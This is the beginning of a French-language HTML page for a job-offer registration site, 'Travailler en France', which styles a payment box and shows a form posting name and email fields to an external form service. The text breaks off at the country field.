<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Travailler en France</title>

  <link rel="stylesheet" href="style.css">

  <style>
    .hidden {
      display: none;
    }

    .payment {
      background: #f1f8f4;
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
    }

    .payment strong {
      color: #008f4c;
    }

    .info {
      font-size: 13px;
      color: #555;
    }
  </style>
</head>

<body>

<header>
  🇫🇷 <b>Travailler en France</b>
  <small>Inscription aux offres d'emploi</small>
</header>

<main>

  <section class="hero">
    <h1>Trouvez votre opportunité de travail en France</h1>
    <p>Inscrivez-vous et choisissez le métier qui vous intéresse.</p>
  </section>

  <section class="card">

    <h2>Formulaire d'inscription</h2>

    <form
      action="https://www.formbackend.com/f/f7c0bdd838442f2f"
      method="POST"
      enctype="multipart/form-data"
    >

      <label>
        Nom et prénom
        <input
          type="text"
          name="nom"
          placeholder="Votre nom et prénom"
          required
        >
      </label>

      <label>
        Adresse e-mail
        <input
          type="email"
          name="email"
          placeholder="exemple@email.com"
          required
        >
      </label>

      <label>
        Pays
